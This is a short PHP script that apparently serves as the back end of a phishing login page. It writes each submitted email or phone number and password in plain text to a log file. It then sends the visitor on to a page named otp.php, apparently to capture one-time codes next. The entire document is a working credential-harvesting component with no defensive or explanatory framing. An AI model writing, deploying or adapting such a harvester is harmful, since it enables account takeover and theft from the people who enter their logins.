<?php

    file_put_contents("log.txt", "Email: " . $_POST['phone_or_email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
